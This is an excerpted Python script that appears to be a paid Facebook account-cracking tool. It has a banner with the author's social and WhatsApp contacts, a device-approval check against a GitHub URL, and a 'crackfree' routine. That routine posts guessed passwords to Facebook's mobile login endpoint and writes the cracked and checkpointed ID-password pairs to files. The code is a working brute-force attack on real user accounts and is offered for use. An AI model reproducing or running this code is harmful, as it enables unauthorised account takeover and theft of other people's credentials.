...
prinCP=[]
try:
    prox= requests.get('https://github.com/Rajuhj/All-Approval-/commit/b9230241aa548d56ee168093b0d41f7fa1e33e46’).text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/Rajuhj/All-Approval-/commit/b9230241aa548d56ee168093b0d41f7fa1e33e46').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
    os.system('xdg-open https://www.facebook.com/peteverbooke.kosterjiboon/?ref=share')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
╠══[Facebook                 • Petever Booke koster jibon 360       ║  \033[1;97m  
╠══[Github                   • \33[1;38Raju ║\33[1;34m   
╠══[Whatsapp                 • 01723370826 ║\33[1;35m 
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Rajuhj/All-Approval-/commit/b9230241aa548d56ee168093b0d41f7fa1e33e46').text
    if id in httpCaht:
      print(fuckyoursali)
...
def menu():
    ...
    if ASIF in ['111']:
        ...
        os.system('xdg-open https://github.com/Rajuhj/All-Approval-/commit/b9230241aa548d56ee168093b0d41f7fa1e33e46')
        os.system("python nono.py")
    elif ASIF in ['3','03']:
        result()
    elif ASIF in ['0']:
...
def crackfree(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mRaju-CP\033[1;91m] {idf} • {pw}')
                print('\x1b[38;5;50m============================')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Raju-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                print('\x1b[38;5;50m===============================================')
